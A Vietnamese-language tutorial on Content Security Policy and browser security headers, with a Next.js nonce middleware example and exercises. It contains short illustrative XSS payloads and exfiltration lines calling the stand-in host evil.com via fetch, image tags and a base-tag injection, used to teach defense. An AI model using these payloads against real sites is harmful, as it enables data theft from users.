---
level: intermediate
area: frontend
prerequisites:
  - 05-cookies-storage.md
  - 06-cors.md
related:
  - ../../05-cross-cutting/security/03-xss-csrf.md
  - ../../05-cross-cutting/security/07-secure-headers-tls.md
---

# CSP & browser security model

> Browser có một tập cơ chế bảo mật mà bạn bật bằng HTTP header. Chúng không thay thế việc viết code an toàn — chúng là lớp thứ hai cho khi lớp thứ nhất hỏng.

## Position

```text
Server → HTTP response headers → Browser thực thi policy → JS/CSS/iframe/request
                                        ↑ ở đây
```

## Problem

Bạn đã escape output, đã validate input, đã dùng React (tự escape). Rồi một dependency bị compromise, hoặc một chỗ dùng `dangerouslySetInnerHTML` với dữ liệu người dùng, hoặc một CMS cho phép nhập HTML.

Một XSS thành công có toàn quyền như code của bạn: đọc DOM, đọc localStorage, gửi request với cookie của người dùng, thay đổi những gì họ thấy.

Câu hỏi của defense in depth: **khi XSS xảy ra, làm sao giới hạn thiệt hại?** Đó là việc của CSP.

## Mental Model

Same-origin policy là nền: mỗi origin là một hộp cách biệt.

CSP thêm một câu hỏi khác: *nội dung nào được phép **chạy hoặc tải** trên trang này?*

```text
SOP:  "JS từ origin A có được đọc dữ liệu của origin B?"     → cách ly dữ liệu
CSP:  "Script này có nằm trong danh sách cho phép không?"    → cách ly việc thực thi
```

CSP là **allowlist**. Mọi thứ không khớp bị chặn. Một XSS chèn `<script>` inline sẽ không chạy nếu policy không cho phép inline script — dù lỗ hổng injection vẫn tồn tại.

## How It Works

### CSP directive

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
```

| Directive | Kiểm soát | Ghi chú |
|---|---|---|
| `default-src` | fallback cho các directive khác | luôn đặt `'self'` |
| `script-src` | JS nào được chạy | directive quan trọng nhất |
| `style-src` | CSS nào được áp dụng | `'unsafe-inline'` thường khó tránh |
| `connect-src` | `fetch`/XHR/WebSocket đi đâu | chặn exfiltration dữ liệu |
| `img-src` | ảnh từ đâu | `data:` cần cho inline SVG |
| `frame-ancestors` | ai được nhúng trang này | thay thế `X-Frame-Options` |
| `form-action` | form submit đi đâu | chặn form bị đổi hướng |
| `base-uri` | `<base>` được đặt thành gì | chặn tấn công đổi base URL |
| `object-src` | plugin | luôn `'none'` |

### Nonce và hash

`'unsafe-inline'` trong `script-src` **vô hiệu hoá phần lớn giá trị của CSP** — nó cho phép chính xác thứ mà XSS cần. Hai cách hợp lệ để chạy inline script:

```html
<!-- nonce: server sinh giá trị RANDOM MỚI cho MỖI response -->
<script nonce="r4nd0m">/* ... */</script>
```

```http
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'
```

Nonce phải **ngẫu nhiên và khác nhau mỗi request**. Nonce cố định = không có bảo vệ, vì attacker chỉ cần đọc nó trong HTML rồi dùng lại.

Hoặc dùng hash cho script tĩnh: `script-src 'sha256-<base64>'`.

`'strict-dynamic'` cho phép script đã được tin cậy (qua nonce) tạo thêm script — cần cho nhiều framework và bundler.

### Report-only

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

Không chặn gì, chỉ báo cáo. **Đây là cách duy nhất đúng để triển khai CSP** lên một app đang chạy: bật report-only, thu vi phạm vài tuần, sửa, rồi mới enforce.

### Các header khác

| Header | Chống | Giá trị |
|---|---|---|
| `Strict-Transport-Security` | downgrade sang HTTP | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
| `Referrer-Policy` | leak URL (có thể chứa token) qua Referer | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | truy cập camera/mic/geolocation | `camera=(), microphone=()` |
| `Cross-Origin-Opener-Policy` | tấn công qua `window.opener` | `same-origin` |
| `X-Frame-Options` | clickjacking (legacy) | dùng `frame-ancestors` thay thế |

Hai điều cần biết:

- `X-XSS-Protection` đã **bị loại bỏ** khỏi các browser hiện đại. Đặt nó không có tác dụng gì; đừng coi là đã bảo vệ.
- **`rel="noopener"`** cho mọi `target="_blank"`. Không có nó, trang đích truy cập được `window.opener` và có thể đổi hướng tab của bạn. Browser hiện đại mặc định `noopener` cho `target="_blank"`, nhưng đặt tường minh vẫn đúng.

### Sandbox iframe

```html
<iframe sandbox="allow-scripts" src="..."></iframe>
```

`sandbox` rỗng = chặn hết. Thêm dần quyền. **Không đặt cả `allow-scripts` và `allow-same-origin`** cho nội dung không tin cậy — kết hợp đó cho phép nội dung tự bỏ sandbox.

## Example

```ts
// Next.js middleware: CSP với nonce mới mỗi request
import { NextResponse, type NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const nonce = crypto.randomUUID();
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `object-src 'none'`,
    `base-uri 'self'`,
  ].join('; ');

  const headers = new Headers(req.headers);
  headers.set('x-nonce', nonce);          // để component đọc lại
  const res = NextResponse.next({ request: { headers } });
  res.headers.set('Content-Security-Policy', csp);
  return res;
}
```

## Prediction

1. Có `script-src 'self'`. Attacker chèn `<script>alert(1)</script>` vào nội dung — script chạy không?
2. Cùng policy, attacker chèn `<img src=x onerror="alert(1)">` — chạy không?
3. Bạn thêm `'unsafe-inline'` vào `script-src` — hai câu trên đổi thế nào?
4. `connect-src 'self'` và XSS thành công. Attacker có gửi được localStorage tới `evil.com` bằng `fetch` không? Còn bằng `<img src="https://evil.com?d=...">`?
5. Nonce được sinh một lần lúc build thay vì mỗi request — bảo vệ còn lại bao nhiêu?

Câu 4 là câu quan trọng: nó cho thấy vì sao cần khoá **nhiều** directive, không chỉ `connect-src`.

## Break It

| Phá thế nào | Quan sát |
|---|---|
| Bật CSP nghiêm ngặt lên app đang chạy | Rất nhiều thứ hỏng — lý do phải dùng report-only trước |
| Thêm `'unsafe-inline'` rồi thử inline `onerror` | Chạy được — chứng minh `unsafe-inline` xoá bỏ bảo vệ |
| Dùng nonce cố định, thử inline script với nonce đó | Chạy — chứng minh nonce phải ngẫu nhiên mỗi request |
| `connect-src 'self'` rồi thử `fetch('https://evil.com')` từ console | Bị chặn, có log rõ trong console |
| Bỏ `img-src` khỏi policy nhưng giữ `connect-src` | Exfiltrate được qua `<img src>` — bài học về đường thoát khác |
| Nhúng trang vào iframe khi không có `frame-ancestors` | Clickjacking khả thi |
| `sandbox="allow-scripts allow-same-origin"` với nội dung lạ | Nội dung tự tháo được sandbox |

## What Usually Goes Wrong

- **`'unsafe-inline'` trong `script-src`** vì "không thì app hỏng". Đây là CSP có tên mà không có tác dụng.
- **`'unsafe-eval'`** cần bởi một số thư viện cũ; nó cho phép `eval`, `new Function` — nguồn injection.
- **Nonce không đổi** mỗi request (hardcode, hoặc cache HTML có nonce).
- **Enforce ngay** thay vì report-only → hỏng production.
- **Quên `connect-src`** → XSS vẫn exfiltrate được dữ liệu.
- **Quên `base-uri`** → attacker chèn `<base href="//evil.com">`, mọi URL tương đối đổi hướng.
- **CSP đặt trên HTML nhưng không trên Route Handler** — không quan trọng lắm, nhưng CSP trên response JSON là vô nghĩa; đừng nhầm là đã bảo vệ API.
- **Coi CSP là thay thế cho escape output.** Nó là lớp hai.

## Common Misconceptions

| Tưởng rằng | Thực tế |
|---|---|
| CSP chặn được XSS | Giới hạn thiệt hại của XSS. Lỗ hổng vẫn ở đó |
| React nên không cần CSP | React escape text, nhưng `dangerouslySetInnerHTML`, `href="javascript:"`, và dependency vẫn là đường vào |
| `X-XSS-Protection` giúp bảo vệ | Đã bị loại bỏ; không có tác dụng |
| `HttpOnly` + CSP = an toàn hoàn toàn | XSS vẫn gửi request thay người dùng được (cookie tự đi kèm) |
| CSP làm chậm trang | Chi phí gần như bằng 0 |
| Chỉ cần `script-src` | Cần cả `connect-src`, `img-src`, `base-uri`, `form-action` để bịt đường thoát |
| CSP bảo vệ API | CSP là chính sách cho tài liệu trong browser, không cho API |

## Debugging

1. Console ghi **chính xác** directive nào bị vi phạm và tài nguyên nào bị chặn. Đây là nguồn thông tin đầy đủ nhất — đọc nó trước.
2. DevTools → Network → response headers, xác nhận CSP **thật** đang được gửi (proxy/CDN có thể thêm hoặc ghi đè).
3. Bật `Content-Security-Policy-Report-Only` với `report-uri` và thu thập vi phạm từ người dùng thật. Bạn sẽ thấy các vi phạm mà local không có (extension, script của bên thứ ba).
4. Trang trắng sau khi bật CSP → gần như luôn là script chính bị chặn; kiểm tra nonce có tới được thẻ `<script>` hay không.
5. Dùng `securityheaders.com` hoặc Lighthouse → Best Practices để kiểm tra nhanh tập header.
6. Style bị mất → `style-src`; ảnh mất → `img-src`; fetch fail nhưng `curl` được → `connect-src`.

## Production Considerations

- **Lộ trình triển khai:** report-only → thu log 2–4 tuần → sửa vi phạm → enforce → thắt dần.
- **HSTS `preload`** là quyết định gần như không thể hoàn tác — bật khi chắc chắn toàn bộ subdomain đã HTTPS.
- Nonce yêu cầu HTML **không được cache chung**. Nếu cache HTML ở CDN, dùng hash-based CSP thay vì nonce.
- Script bên thứ ba (analytics, chat) là lý do phổ biến nhất phải nới CSP. Cân nhắc self-host chúng để giữ `'self'`.
- Có endpoint nhận CSP report và **thực sự xem nó** — report không ai đọc thì không có giá trị.

## Trade-offs

| Quyết định | Được | Mất |
|---|---|---|
| CSP nghiêm ngặt với nonce | giảm mạnh tác động XSS | công sức triển khai; HTML không cache chung được |
| Hash-based CSP | HTML cache được | phải cập nhật hash mỗi lần đổi script |
| `'unsafe-inline'` | dễ triển khai | mất phần lớn giá trị |
| Report-only lâu dài | không hỏng gì | không bảo vệ gì cả |
| Self-host script bên thứ ba | CSP chặt, ít domain | tự cập nhật, tự chịu trách nhiệm |

## Explain Without Notes

1. SOP và CSP giải quyết hai vấn đề khác nhau nào?
2. Vì sao `'unsafe-inline'` làm CSP gần như vô dụng?
3. Vì sao nonce phải ngẫu nhiên mỗi request?
4. Ngoài `script-src`, hai directive nào cần thiết để chặn exfiltration, và vì sao?
5. Lộ trình an toàn để bật CSP cho app đang chạy?

## Related

- [XSS & CSRF](../../05-cross-cutting/security/03-xss-csrf.md) — lỗ hổng mà CSP giảm thiểu
- [Secure headers & TLS](../../05-cross-cutting/security/07-secure-headers-tls.md) — tập header đầy đủ
- [Cookies & storage](05-cookies-storage.md) — `HttpOnly` là lớp bổ sung
- [CORS](06-cors.md) — cơ chế khác, đừng nhầm lẫn
- [Middleware & auth patterns](../03-nextjs/06-middleware-auth-patterns.md) — nơi đặt header trong Next.js
